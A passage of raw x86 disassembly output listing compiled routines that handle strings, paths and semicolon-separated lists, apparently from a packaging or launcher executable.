  402710:	85 c0                	test   %eax,%eax
  402712:	75 3c                	jne    0x402750
  402714:	c7 83 6c 40 00 00 01 	movl   $0x1,0x406c(%ebx)
  40271b:	00 00 00 
  40271e:	89 1c 24             	mov    %ebx,(%esp)
  402721:	e8 ba 16 00 00       	call   0x403de0
  402726:	85 c0                	test   %eax,%eax
  402728:	75 26                	jne    0x402750
  40272a:	89 1c 24             	mov    %ebx,(%esp)
  40272d:	e8 3e 1a 00 00       	call   0x404170
  402732:	85 c0                	test   %eax,%eax
  402734:	75 1a                	jne    0x402750
  402736:	89 1c 24             	mov    %ebx,(%esp)
  402739:	e8 82 1d 00 00       	call   0x4044c0
  40273e:	85 c0                	test   %eax,%eax
  402740:	75 0e                	jne    0x402750
  402742:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  402746:	83 c4 18             	add    $0x18,%esp
  402749:	5b                   	pop    %ebx
  40274a:	e9 f1 fc ff ff       	jmp    0x402440
  40274f:	90                   	nop
  402750:	83 c4 18             	add    $0x18,%esp
  402753:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402758:	5b                   	pop    %ebx
  402759:	c3                   	ret
  40275a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402760:	e9 ab 1d 00 00       	jmp    0x404510
  402765:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402769:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402770:	f3 c3                	repz ret
  402772:	90                   	nop
  402773:	90                   	nop
  402774:	90                   	nop
  402775:	90                   	nop
  402776:	90                   	nop
  402777:	90                   	nop
  402778:	90                   	nop
  402779:	90                   	nop
  40277a:	90                   	nop
  40277b:	90                   	nop
  40277c:	90                   	nop
  40277d:	90                   	nop
  40277e:	90                   	nop
  40277f:	90                   	nop
  402780:	55                   	push   %ebp
  402781:	57                   	push   %edi
  402782:	b8 1c 30 00 00       	mov    $0x301c,%eax
  402787:	56                   	push   %esi
  402788:	53                   	push   %ebx
  402789:	e8 52 7e 00 00       	call   0x40a5e0
  40278e:	29 c4                	sub    %eax,%esp
  402790:	c7 44 24 04 78 40 00 	movl   $0x4078,0x4(%esp)
  402797:	00 
  402798:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40279f:	e8 4c 81 00 00       	call   0x40a8f0
  4027a4:	85 c0                	test   %eax,%eax
  4027a6:	89 c3                	mov    %eax,%ebx
  4027a8:	0f 84 c9 02 00 00    	je     0x402a77
  4027ae:	8b 84 24 34 30 00 00 	mov    0x3034(%esp),%eax
  4027b5:	8d 7c 24 10          	lea    0x10(%esp),%edi
  4027b9:	8d b4 24 10 10 00 00 	lea    0x1010(%esp),%esi
  4027c0:	8b 00                	mov    (%eax),%eax
  4027c2:	89 3c 24             	mov    %edi,(%esp)
  4027c5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4027c9:	e8 c2 05 00 00       	call   0x402d90
  4027ce:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  4027d5:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4027d9:	89 04 24             	mov    %eax,(%esp)
  4027dc:	e8 5f 06 00 00       	call   0x402e40
  4027e1:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4027e5:	89 34 24             	mov    %esi,(%esp)
  4027e8:	e8 43 06 00 00       	call   0x402e30
  4027ed:	c7 04 24 d3 c2 40 00 	movl   $0x40c2d3,(%esp)
  4027f4:	e8 67 1d 00 00       	call   0x404560
  4027f9:	c7 04 24 d3 c2 40 00 	movl   $0x40c2d3,(%esp)
  402800:	89 c5                	mov    %eax,%ebp
  402802:	e8 79 1e 00 00       	call   0x404680
  402807:	89 f2                	mov    %esi,%edx
  402809:	8b 0a                	mov    (%edx),%ecx
  40280b:	83 c2 04             	add    $0x4,%edx
  40280e:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  402814:	f7 d1                	not    %ecx
  402816:	21 c8                	and    %ecx,%eax
  402818:	25 80 80 80 80       	and    $0x80808080,%eax
  40281d:	74 ea                	je     0x402809
  40281f:	89 c1                	mov    %eax,%ecx
  402821:	89 74 24 04          	mov    %esi,0x4(%esp)
  402825:	89 1c 24             	mov    %ebx,(%esp)
  402828:	c1 e9 10             	shr    $0x10,%ecx
  40282b:	a9 80 80 00 00       	test   $0x8080,%eax
  402830:	0f 44 c1             	cmove  %ecx,%eax
  402833:	8d 4a 02             	lea    0x2(%edx),%ecx
  402836:	0f 44 d1             	cmove  %ecx,%edx
  402839:	00 c0                	add    %al,%al
  40283b:	83 da 03             	sbb    $0x3,%edx
  40283e:	29 f2                	sub    %esi,%edx
  402840:	01 fa                	add    %edi,%edx
  402842:	89 54 24 08          	mov    %edx,0x8(%esp)
  402846:	e8 45 f4 ff ff       	call   0x401c90
  40284b:	85 c0                	test   %eax,%eax
  40284d:	0f 85 8d 00 00 00    	jne    0x4028e0
  402853:	8b 84 24 30 30 00 00 	mov    0x3030(%esp),%eax
  40285a:	85 ed                	test   %ebp,%ebp
  40285c:	89 83 70 40 00 00    	mov    %eax,0x4070(%ebx)
  402862:	8b 84 24 34 30 00 00 	mov    0x3034(%esp),%eax
  402869:	89 83 74 40 00 00    	mov    %eax,0x4074(%ebx)
  40286f:	0f 84 1e 01 00 00    	je     0x402993
  402875:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40287c:	00 
  40287d:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402881:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402888:	e8 83 29 00 00       	call   0x405210
  40288d:	89 c7                	mov    %eax,%edi
  40288f:	89 04 24             	mov    %eax,(%esp)
  402892:	ff 15 88 f2 41 00    	call   *0x41f288
  402898:	83 ec 04             	sub    $0x4,%esp
  40289b:	89 3c 24             	mov    %edi,(%esp)
  40289e:	e8 f5 7f 00 00       	call   0x40a898
  4028a3:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4028a7:	89 34 24             	mov    %esi,(%esp)
  4028aa:	e8 39 80 00 00       	call   0x40a8e8
  4028af:	85 c0                	test   %eax,%eax
  4028b1:	0f 85 a9 00 00 00    	jne    0x402960
  4028b7:	89 1c 24             	mov    %ebx,(%esp)
  4028ba:	e8 e1 fd ff ff       	call   0x4026a0
  4028bf:	89 1c 24             	mov    %ebx,(%esp)
  4028c2:	e8 39 fe ff ff       	call   0x402700
  4028c7:	89 1c 24             	mov    %ebx,(%esp)
  4028ca:	89 c6                	mov    %eax,%esi
  4028cc:	e8 8f fe ff ff       	call   0x402760
  4028d1:	89 f0                	mov    %esi,%eax
  4028d3:	81 c4 1c 30 00 00    	add    $0x301c,%esp
  4028d9:	5b                   	pop    %ebx
  4028da:	5e                   	pop    %esi
  4028db:	5f                   	pop    %edi
  4028dc:	5d                   	pop    %ebp
  4028dd:	c3                   	ret
  4028de:	66 90                	xchg   %ax,%ax
  4028e0:	89 f2                	mov    %esi,%edx
  4028e2:	8b 0a                	mov    (%edx),%ecx
  4028e4:	83 c2 04             	add    $0x4,%edx
  4028e7:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  4028ed:	f7 d1                	not    %ecx
  4028ef:	21 c8                	and    %ecx,%eax
  4028f1:	25 80 80 80 80       	and    $0x80808080,%eax
  4028f6:	74 ea                	je     0x4028e2
  4028f8:	89 c1                	mov    %eax,%ecx
  4028fa:	89 74 24 04          	mov    %esi,0x4(%esp)
  4028fe:	89 1c 24             	mov    %ebx,(%esp)
  402901:	c1 e9 10             	shr    $0x10,%ecx
  402904:	a9 80 80 00 00       	test   $0x8080,%eax
  402909:	0f 44 c1             	cmove  %ecx,%eax
  40290c:	8d 4a 02             	lea    0x2(%edx),%ecx
  40290f:	0f 44 d1             	cmove  %ecx,%edx
  402912:	00 c0                	add    %al,%al
  402914:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  40291b:	83 da 03             	sbb    $0x3,%edx
  40291e:	29 f2                	sub    %esi,%edx
  402920:	01 c2                	add    %eax,%edx
  402922:	89 54 24 08          	mov    %edx,0x8(%esp)
  402926:	e8 65 f3 ff ff       	call   0x401c90
  40292b:	85 c0                	test   %eax,%eax
  40292d:	0f 84 20 ff ff ff    	je     0x402853
  402933:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  40293a:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40293e:	c7 04 24 e0 c2 40 00 	movl   $0x40c2e0,(%esp)
  402945:	89 44 24 08          	mov    %eax,0x8(%esp)
  402949:	e8 c2 f4 ff ff       	call   0x401e10
  40294e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402953:	e9 7b ff ff ff       	jmp    0x4028d3
  402958:	90                   	nop
  402959:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402960:	8d b3 68 20 00 00    	lea    0x2068(%ebx),%esi
  402966:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40296a:	89 34 24             	mov    %esi,(%esp)
  40296d:	e8 46 7f 00 00       	call   0x40a8b8
  402972:	8d 83 68 30 00 00    	lea    0x3068(%ebx),%eax
  402978:	89 74 24 04          	mov    %esi,0x4(%esp)
  40297c:	c7 83 68 40 00 00 01 	movl   $0x1,0x4068(%ebx)
  402983:	00 00 00 
  402986:	89 04 24             	mov    %eax,(%esp)
  402989:	e8 2a 7f 00 00       	call   0x40a8b8
  40298e:	e9 24 ff ff ff       	jmp    0x4028b7
  402993:	89 1c 24             	mov    %ebx,(%esp)
  402996:	e8 65 f9 ff ff       	call   0x402300
  40299b:	85 c0                	test   %eax,%eax
  40299d:	0f 84 8d 00 00 00    	je     0x402a30
  4029a3:	89 1c 24             	mov    %ebx,(%esp)
  4029a6:	e8 d5 f9 ff ff       	call   0x402380
  4029ab:	85 c0                	test   %eax,%eax
  4029ad:	0f 85 b0 00 00 00    	jne    0x402a63
  4029b3:	80 bb 68 20 00 00 00 	cmpb   $0x0,0x2068(%ebx)
  4029ba:	8d ab 68 20 00 00    	lea    0x2068(%ebx),%ebp
  4029c0:	c7 04 24 d3 c2 40 00 	movl   $0x40c2d3,(%esp)
  4029c7:	0f 45 f5             	cmovne %ebp,%esi
  4029ca:	89 74 24 04          	mov    %esi,0x4(%esp)
  4029ce:	e8 3d 1c 00 00       	call   0x404610
  4029d3:	c7 04 24 d3 c2 40 00 	movl   $0x40c2d3,(%esp)
  4029da:	e8 81 1b 00 00       	call   0x404560
  4029df:	89 1c 24             	mov    %ebx,(%esp)
  4029e2:	e8 89 22 00 00       	call   0x404c70
  4029e7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029ea:	74 77                	je     0x402a63
  4029ec:	e8 7f fd ff ff       	call   0x402770
  4029f1:	8b 84 24 34 30 00 00 	mov    0x3034(%esp),%eax
  4029f8:	89 3c 24             	mov    %edi,(%esp)
  4029fb:	89 44 24 08          	mov    %eax,0x8(%esp)
  4029ff:	8b 84 24 30 30 00 00 	mov    0x3030(%esp),%eax
  402a06:	89 44 24 04          	mov    %eax,0x4(%esp)
  402a0a:	e8 71 22 00 00       	call   0x404c80
  402a0f:	83 bb 68 40 00 00 01 	cmpl   $0x1,0x4068(%ebx)
  402a16:	89 c6                	mov    %eax,%esi
  402a18:	74 53                	je     0x402a6d
  402a1a:	89 1c 24             	mov    %ebx,(%esp)
  402a1d:	e8 1e f3 ff ff       	call   0x401d40
  402a22:	89 f0                	mov    %esi,%eax
  402a24:	e9 aa fe ff ff       	jmp    0x4028d3
  402a29:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402a30:	89 74 24 04          	mov    %esi,0x4(%esp)
  402a34:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402a3b:	00 
  402a3c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402a43:	e8 c8 27 00 00       	call   0x405210
  402a48:	89 c6                	mov    %eax,%esi
  402a4a:	89 04 24             	mov    %eax,(%esp)
  402a4d:	ff 15 88 f2 41 00    	call   *0x41f288
  402a53:	83 ec 04             	sub    $0x4,%esp
  402a56:	89 34 24             	mov    %esi,(%esp)
  402a59:	e8 3a 7e 00 00       	call   0x40a898
  402a5e:	e9 54 fe ff ff       	jmp    0x4028b7
  402a63:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a68:	e9 66 fe ff ff       	jmp    0x4028d3
  402a6d:	89 2c 24             	mov    %ebp,(%esp)
  402a70:	e8 8b 1d 00 00       	call   0x404800
  402a75:	eb a3                	jmp    0x402a1a
  402a77:	c7 04 24 a8 c2 40 00 	movl   $0x40c2a8,(%esp)
  402a7e:	e8 8d f3 ff ff       	call   0x401e10
  402a83:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a88:	e9 46 fe ff ff       	jmp    0x4028d3
  402a8d:	90                   	nop
  402a8e:	90                   	nop
  402a8f:	90                   	nop
  402a90:	56                   	push   %esi
  402a91:	53                   	push   %ebx
  402a92:	83 ec 14             	sub    $0x14,%esp
  402a95:	8b 74 24 24          	mov    0x24(%esp),%esi
  402a99:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402a9d:	89 34 24             	mov    %esi,(%esp)
  402aa0:	e8 23 7e 00 00       	call   0x40a8c8
  402aa5:	83 c0 01             	add    $0x1,%eax
  402aa8:	89 74 24 04          	mov    %esi,0x4(%esp)
  402aac:	89 1c 24             	mov    %ebx,(%esp)
  402aaf:	89 44 24 08          	mov    %eax,0x8(%esp)
  402ab3:	e8 40 7e 00 00       	call   0x40a8f8
  402ab8:	89 1c 24             	mov    %ebx,(%esp)
  402abb:	e8 08 7e 00 00       	call   0x40a8c8
  402ac0:	01 d8                	add    %ebx,%eax
  402ac2:	80 38 5c             	cmpb   $0x5c,(%eax)
  402ac5:	74 1d                	je     0x402ae4
  402ac7:	c7 44 24 04 5c 00 00 	movl   $0x5c,0x4(%esp)
  402ace:	00 
  402acf:	89 1c 24             	mov    %ebx,(%esp)
  402ad2:	e8 29 7e 00 00       	call   0x40a900
  402ad7:	85 c0                	test   %eax,%eax
  402ad9:	74 15                	je     0x402af0
  402adb:	c6 00 00             	movb   $0x0,(%eax)
  402ade:	83 c4 14             	add    $0x14,%esp
  402ae1:	5b                   	pop    %ebx
  402ae2:	5e                   	pop    %esi
  402ae3:	c3                   	ret
  402ae4:	c6 00 00             	movb   $0x0,(%eax)
  402ae7:	eb de                	jmp    0x402ac7
  402ae9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402af0:	c6 03 2e             	movb   $0x2e,(%ebx)
  402af3:	c6 43 01 00          	movb   $0x0,0x1(%ebx)
  402af7:	83 c4 14             	add    $0x14,%esp
  402afa:	5b                   	pop    %ebx
  402afb:	5e                   	pop    %esi
  402afc:	c3                   	ret
  402afd:	8d 76 00             	lea    0x0(%esi),%esi
  402b00:	56                   	push   %esi
  402b01:	53                   	push   %ebx
  402b02:	83 ec 14             	sub    $0x14,%esp
  402b05:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  402b09:	c7 44 24 04 5c 00 00 	movl   $0x5c,0x4(%esp)
  402b10:	00 
  402b11:	8b 74 24 20          	mov    0x20(%esp),%esi
  402b15:	89 1c 24             	mov    %ebx,(%esp)
  402b18:	e8 e3 7d 00 00       	call   0x40a900
  402b1d:	85 c0                	test   %eax,%eax
  402b1f:	74 1f                	je     0x402b40
  402b21:	8d 58 01             	lea    0x1(%eax),%ebx
  402b24:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  402b28:	89 74 24 20          	mov    %esi,0x20(%esp)
  402b2c:	83 c4 14             	add    $0x14,%esp
  402b2f:	5b                   	pop    %ebx
  402b30:	5e                   	pop    %esi
  402b31:	e9 82 7d 00 00       	jmp    0x40a8b8
  402b36:	8d 76 00             	lea    0x0(%esi),%esi
  402b39:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402b40:	c7 44 24 04 2f 00 00 	movl   $0x2f,0x4(%esp)
  402b47:	00 
  402b48:	89 1c 24             	mov    %ebx,(%esp)
  402b4b:	e8 b0 7d 00 00       	call   0x40a900
  402b50:	85 c0                	test   %eax,%eax
  402b52:	74 d0                	je     0x402b24
  402b54:	eb cb                	jmp    0x402b21
  402b56:	8d 76 00             	lea    0x0(%esi),%esi
  402b59:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402b60:	55                   	push   %ebp
  402b61:	57                   	push   %edi
  402b62:	56                   	push   %esi
  402b63:	53                   	push   %ebx
  402b64:	83 ec 1c             	sub    $0x1c,%esp
  402b67:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  402b6b:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  402b6f:	8b 74 24 38          	mov    0x38(%esp),%esi
  402b73:	85 db                	test   %ebx,%ebx
  402b75:	0f 84 a5 00 00 00    	je     0x402c20
  402b7b:	8d 7b 04             	lea    0x4(%ebx),%edi
  402b7e:	89 d9                	mov    %ebx,%ecx
  402b80:	31 c0                	xor    %eax,%eax
  402b82:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  402b88:	c7 83 fc 0f 00 00 00 	movl   $0x0,0xffc(%ebx)
  402b8f:	00 00 00 
  402b92:	83 e7 fc             	and    $0xfffffffc,%edi
  402b95:	29 f9                	sub    %edi,%ecx
  402b97:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  402b9d:	c1 e9 02             	shr    $0x2,%ecx
  402ba0:	f3 ab                	rep stos %eax,%es:(%edi)
  402ba2:	89 2c 24             	mov    %ebp,(%esp)
  402ba5:	e8 1e 7d 00 00       	call   0x40a8c8
  402baa:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402bae:	89 44 24 08          	mov    %eax,0x8(%esp)
  402bb2:	89 1c 24             	mov    %ebx,(%esp)
  402bb5:	e8 3e 7d 00 00       	call   0x40a8f8
  402bba:	89 1c 24             	mov    %ebx,(%esp)
  402bbd:	e8 06 7d 00 00       	call   0x40a8c8
  402bc2:	80 7c 03 ff 5c       	cmpb   $0x5c,-0x1(%ebx,%eax,1)
  402bc7:	74 09                	je     0x402bd2
  402bc9:	c6 04 03 5c          	movb   $0x5c,(%ebx,%eax,1)
  402bcd:	c6 44 03 01 00       	movb   $0x0,0x1(%ebx,%eax,1)
  402bd2:	89 34 24             	mov    %esi,(%esp)
  402bd5:	e8 ee 7c 00 00       	call   0x40a8c8
  402bda:	80 7c 06 ff 5c       	cmpb   $0x5c,-0x1(%esi,%eax,1)
  402bdf:	74 1f                	je     0x402c00
  402be1:	89 74 24 04          	mov    %esi,0x4(%esp)
  402be5:	89 1c 24             	mov    %ebx,(%esp)
  402be8:	e8 d3 7c 00 00       	call   0x40a8c0
  402bed:	89 d8                	mov    %ebx,%eax
  402bef:	83 c4 1c             	add    $0x1c,%esp
  402bf2:	5b                   	pop    %ebx
  402bf3:	5e                   	pop    %esi
  402bf4:	5f                   	pop    %edi
  402bf5:	5d                   	pop    %ebp
  402bf6:	c3                   	ret
  402bf7:	89 f6                	mov    %esi,%esi
  402bf9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402c00:	83 e8 02             	sub    $0x2,%eax
  402c03:	89 74 24 04          	mov    %esi,0x4(%esp)
  402c07:	89 1c 24             	mov    %ebx,(%esp)
  402c0a:	89 44 24 08          	mov    %eax,0x8(%esp)
  402c0e:	e8 f5 7c 00 00       	call   0x40a908
  402c13:	83 c4 1c             	add    $0x1c,%esp
  402c16:	89 d8                	mov    %ebx,%eax
  402c18:	5b                   	pop    %ebx
  402c19:	5e                   	pop    %esi
  402c1a:	5f                   	pop    %edi
  402c1b:	5d                   	pop    %ebp
  402c1c:	c3                   	ret
  402c1d:	8d 76 00             	lea    0x0(%esi),%esi
  402c20:	89 2c 24             	mov    %ebp,(%esp)
  402c23:	e8 a0 7c 00 00       	call   0x40a8c8
  402c28:	89 34 24             	mov    %esi,(%esp)
  402c2b:	89 c3                	mov    %eax,%ebx
  402c2d:	e8 96 7c 00 00       	call   0x40a8c8
  402c32:	8d 7c 03 02          	lea    0x2(%ebx,%eax,1),%edi
  402c36:	89 3c 24             	mov    %edi,(%esp)
  402c39:	e8 12 7c 00 00       	call   0x40a850
  402c3e:	85 c0                	test   %eax,%eax
  402c40:	89 c3                	mov    %eax,%ebx
  402c42:	74 19                	je     0x402c5d
  402c44:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402c48:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402c4f:	00 
  402c50:	89 04 24             	mov    %eax,(%esp)
  402c53:	e8 b8 7c 00 00       	call   0x40a910
  402c58:	e9 45 ff ff ff       	jmp    0x402ba2
  402c5d:	31 c0                	xor    %eax,%eax
  402c5f:	eb 8e                	jmp    0x402bef
  402c61:	eb 0d                	jmp    0x402c70
  402c63:	90                   	nop
  402c64:	90                   	nop
  402c65:	90                   	nop
  402c66:	90                   	nop
  402c67:	90                   	nop
  402c68:	90                   	nop
  402c69:	90                   	nop
  402c6a:	90                   	nop
  402c6b:	90                   	nop
  402c6c:	90                   	nop
  402c6d:	90                   	nop
  402c6e:	90                   	nop
  402c6f:	90                   	nop
  402c70:	f3 c3                	repz ret
  402c72:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402c79:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402c80:	83 ec 1c             	sub    $0x1c,%esp
  402c83:	8b 44 24 24          	mov    0x24(%esp),%eax
  402c87:	89 44 24 08          	mov    %eax,0x8(%esp)
  402c8b:	8b 44 24 28          	mov    0x28(%esp),%eax
  402c8f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402c93:	8b 44 24 20          	mov    0x20(%esp),%eax
  402c97:	89 04 24             	mov    %eax,(%esp)
  402c9a:	ff 15 f4 f2 41 00    	call   *0x41f2f4
  402ca0:	85 c0                	test   %eax,%eax
  402ca2:	0f 95 c0             	setne  %al
  402ca5:	83 c4 1c             	add    $0x1c,%esp
  402ca8:	0f b6 c0             	movzbl %al,%eax
  402cab:	c3                   	ret
  402cac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402cb0:	55                   	push   %ebp
  402cb1:	57                   	push   %edi
  402cb2:	b8 2c 10 00 00       	mov    $0x102c,%eax
  402cb7:	56                   	push   %esi
  402cb8:	53                   	push   %ebx
  402cb9:	e8 22 79 00 00       	call   0x40a5e0
  402cbe:	29 c4                	sub    %eax,%esp
  402cc0:	c7 04 24 04 c3 40 00 	movl   $0x40c304,(%esp)
  402cc7:	e8 4c 7c 00 00       	call   0x40a918
  402ccc:	85 c0                	test   %eax,%eax
  402cce:	89 c7                	mov    %eax,%edi
  402cd0:	0f 84 a7 00 00 00    	je     0x402d7d
  402cd6:	8d 74 24 1f          	lea    0x1f(%esp),%esi
  402cda:	eb 4c                	jmp    0x402d28
  402cdc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402ce0:	89 c3                	mov    %eax,%ebx
  402ce2:	b8 00 10 00 00       	mov    $0x1000,%eax
  402ce7:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402ceb:	29 fb                	sub    %edi,%ebx
  402ced:	89 34 24             	mov    %esi,(%esp)
  402cf0:	8d 7d 01             	lea    0x1(%ebp),%edi
  402cf3:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402cf9:	0f 47 d8             	cmova  %eax,%ebx
  402cfc:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  402d00:	e8 f3 7b 00 00       	call   0x40a8f8
  402d05:	8b 84 24 44 10 00 00 	mov    0x1044(%esp),%eax
  402d0c:	c6 44 1c 1f 00       	movb   $0x0,0x1f(%esp,%ebx,1)
  402d11:	89 74 24 04          	mov    %esi,0x4(%esp)
  402d15:	89 44 24 08          	mov    %eax,0x8(%esp)
  402d19:	8b 84 24 40 10 00 00 	mov    0x1040(%esp),%eax
  402d20:	89 04 24             	mov    %eax,(%esp)
  402d23:	e8 38 fe ff ff       	call   0x402b60
  402d28:	c7 44 24 04 3b 00 00 	movl   $0x3b,0x4(%esp)
  402d2f:	00 
  402d30:	89 3c 24             	mov    %edi,(%esp)
  402d33:	e8 e8 7b 00 00       	call   0x40a920
  402d38:	85 c0                	test   %eax,%eax
  402d3a:	89 c5                	mov    %eax,%ebp
  402d3c:	75 a2                	jne    0x402ce0
  402d3e:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402d45:	00 
  402d46:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402d4a:	89 34 24             	mov    %esi,(%esp)
  402d4d:	e8 a6 7b 00 00       	call   0x40a8f8
  402d52:	8b 84 24 44 10 00 00 	mov    0x1044(%esp),%eax
  402d59:	89 74 24 04          	mov    %esi,0x4(%esp)
  402d5d:	89 44 24 08          	mov    %eax,0x8(%esp)
  402d61:	8b 84 24 40 10 00 00 	mov    0x1040(%esp),%eax
  402d68:	89 04 24             	mov    %eax,(%esp)
  402d6b:	e8 f0 fd ff ff       	call   0x402b60
  402d70:	31 c0                	xor    %eax,%eax
  402d72:	81 c4 2c 10 00 00    	add    $0x102c,%esp
  402d78:	5b                   	pop    %ebx
  402d79:	5e                   	pop    %esi
  402d7a:	5f                   	pop    %edi
  402d7b:	5d                   	pop    %ebp
  402d7c:	c3                   	ret
  402d7d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402d82:	eb ee                	jmp    0x402d72
  402d84:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402d8a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  402d90:	53                   	push   %ebx
  402d91:	b8 18 20 00 00       	mov    $0x2018,%eax
  402d96:	e8 45 78 00 00       	call   0x40a5e0
  402d9b:	29 c4                	sub    %eax,%esp
  402d9d:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  402da1:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402da8:	00 
  402da9:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402db0:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402db4:	ff 15 50 f2 41 00    	call   *0x41f250
  402dba:	83 ec 0c             	sub    $0xc,%esp
  402dbd:	85 c0                	test   %eax,%eax
  402dbf:	74 2f                	je     0x402df0
  402dc1:	8b 84 24 20 20 00 00 	mov    0x2020(%esp),%eax
  402dc8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402dcf:	00 
  402dd0:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402dd4:	89 04 24             	mov    %eax,(%esp)
  402dd7:	e8 94 22 00 00       	call   0x405070
  402ddc:	85 c0                	test   %eax,%eax
  402dde:	74 2c                	je     0x402e0c
  402de0:	31 c0                	xor    %eax,%eax
  402de2:	81 c4 18 20 00 00    	add    $0x2018,%esp
  402de8:	5b                   	pop    %ebx
  402de9:	c3                   	ret
  402dea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402df0:	e8 7b 20 00 00       	call   0x404e70
  402df5:	c7 04 24 0c c3 40 00 	movl   $0x40c30c,(%esp)
  402dfc:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e00:	e8 0b f0 ff ff       	call   0x401e10
  402e05:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402e0a:	eb d6                	jmp    0x402de2
  402e0c:	e8 5f 20 00 00       	call   0x404e70
  402e11:	c7 04 24 44 c3 40 00 	movl   $0x40c344,(%esp)
  402e18:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e1c:	e8 ef ef ff ff       	call   0x401e10
  402e21:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402e26:	eb ba                	jmp    0x402de2
  402e28:	90                   	nop
  402e29:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402e30:	e9 5b fc ff ff       	jmp    0x402a90
  402e35:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402e39:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402e40:	53                   	push   %ebx
  402e41:	83 ec 18             	sub    $0x18,%esp
  402e44:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402e48:	8b 44 24 24          	mov    0x24(%esp),%eax
  402e4c:	89 1c 24             	mov    %ebx,(%esp)
  402e4f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e53:	e8 60 7a 00 00       	call   0x40a8b8
  402e58:	89 1c 24             	mov    %ebx,(%esp)
  402e5b:	e8 68 7a 00 00       	call   0x40a8c8
  402e60:	c7 44 03 fd 70 6b 67 	movl   $0x676b70,-0x3(%ebx,%eax,1)
  402e67:	00 
  402e68:	83 c4 18             	add    $0x18,%esp
  402e6b:	5b                   	pop    %ebx
  402e6c:	c3                   	ret
  402e6d:	8d 76 00             	lea    0x0(%esi),%esi
  402e70:	56                   	push   %esi
  402e71:	53                   	push   %ebx
  402e72:	81 ec 34 02 00 00    	sub    $0x234,%esp
  402e78:	8b 84 24 40 02 00 00 	mov    0x240(%esp),%eax
  402e7f:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  402e83:	c7 44 24 08 04 01 00 	movl   $0x104,0x8(%esp)
  402e8a:	00 
  402e8b:	8d 74 24 14          	lea    0x14(%esp),%esi
  402e8f:	89 1c 24             	mov    %ebx,(%esp)
  402e92:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e96:	e8 75 23 00 00       	call   0x405210
  402e9b:	8b 84 24 44 02 00 00 	mov    0x244(%esp),%eax
  402ea2:	89 34 24             	mov    %esi,(%esp)
  402ea5:	c7 44 24 08 0a 00 00 	movl   $0xa,0x8(%esp)
  402eac:	00 
  402ead:	89 44 24 04          	mov    %eax,0x4(%esp)
